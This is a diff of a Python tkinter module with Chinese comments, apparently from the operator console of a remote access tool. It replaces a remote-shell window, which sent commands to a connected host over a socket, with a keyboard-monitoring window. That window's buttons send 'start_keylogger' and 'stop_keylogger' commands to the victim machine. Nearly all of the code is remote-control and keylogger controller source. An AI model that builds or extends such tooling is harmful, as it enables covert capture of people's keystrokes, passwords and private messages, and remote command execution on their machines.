@@ -4,29 +4,29 @@ import tkinter as tk
 from queue import Queue
 import logging
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-class Terminal: 
+class Keyboard: 
     '''
-    开启一个终端窗口
+    开启一个键盘监控窗口
     '''
     def __init__(self, master, client: socket.socket, send_buf: Queue, recv_buf: Queue):
-        self.master = master # 父窗口
-        self.client = client # socket
+        self.master = master  # 父窗口
+        self.client = client  # socket
         # 获取与当前 socket 连接的远程主机的地址信息。该方法返回一个包含远程主机地址的元组
         self.ip = client.getpeername()[0]
-        self.remote_shell = RemoteShell(client, send_buf, recv_buf)
-        self.create_terminal()
+        self.remote_keyboard = RemoteKeyboard(client, send_buf, recv_buf)
+        self.create_keyboard()
     
-    def create_terminal(self):
+    def create_keyboard(self):
         '''
-        开启gui终端
+        新开窗口
         '''
         self.popup = Toplevel(self.master)
-        self.popup.title(f"Terminal - {self.ip}")
+        self.popup.title(f"Keyboard - {self.ip}")
         self.popup.geometry("800x600")
         self.popup.resizable(False, False)
         
-        # 关闭窗口时关闭shell
-        self.popup.protocol("WM_DELETE_WINDOW", self.close_shell)
+        # 关闭窗口时关闭keyboard
+        self.popup.protocol("WM_DELETE_WINDOW", self.close_keyboard)
         
         self.text_area = Text(self.popup, bg="black", fg="white", insertbackground="white", wrap=tk.WORD)
         self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
@@ -37,10 +37,22 @@ class Terminal:
         self.text_area.config(yscrollcommand=scroll_bar.set)
         scroll_bar.config(command=self.text_area.yview)
         
-        # 输入框
-        self.entry = tk.Entry(self.popup, bg="black", fg="white", insertbackground="white")
-        self.entry.pack(fill=tk.X, padx=10, pady=5)
-        self.entry.bind("<Return>", self.execute_command)
+        # 开始监控按钮
+        start_button = tk.Button(
+            self.popup, text="开始监控", command=self.start_monitoring)
+        start_button.pack(side=tk.LEFT, padx=10, pady=10)
+
+        # 停止监控按钮
+        stop_button = tk.Button(self.popup, text="停止监控",
+                                command=self.stop_monitoring)
+        stop_button.pack(side=tk.RIGHT, padx=10, pady=10)
+    
+    def start_monitoring(self):
+        self.remote_keyboard.send_command("start_keylogger")
+        # self.receive_keys()
+
+    def stop_monitoring(self):
+        self.remote_keyboard.send_command("stop_keylogger")
         
     def execute_command(self, event):
         # 获取用户输入的命令
@@ -65,26 +77,18 @@ class Terminal:
         # 自动滚动到最新内容
         self.text_area.see(tk.END)
         
-    def close_shell(self):
-        
-        exit_result = self.remote_shell.send_command("exit")
+    def close_keyboard(self):
+        self.stop_monitoring()
         self.popup.destroy()
-        
-class RemoteShell:
+
+class RemoteKeyboard:
     def __init__(self, client: socket.socket, send_buf: Queue, recv_buf: Queue):
         self.client = client
         self.ip = client.getpeername()[0]
         self.send_buf = send_buf
         self.recv_buf = recv_buf
+
     def send_command(self, command):
-        command = '1' + command
-        logging.debug(f"shell send: {command}")
+        command = '7' + command
+        logging.debug(f"keyboard send: {command}")
         self.send_buf.put(command.encode())
-        if command == '1exit':
-            return 'exit'
-        
-        while True:
-            if self.recv_buf.empty() is False and self.recv_buf.queue[0][:1] == b'1':
-                result = self.recv_buf.get()[1:].decode()
-                logging.debug(f"shell recv: {result}")
-                return result
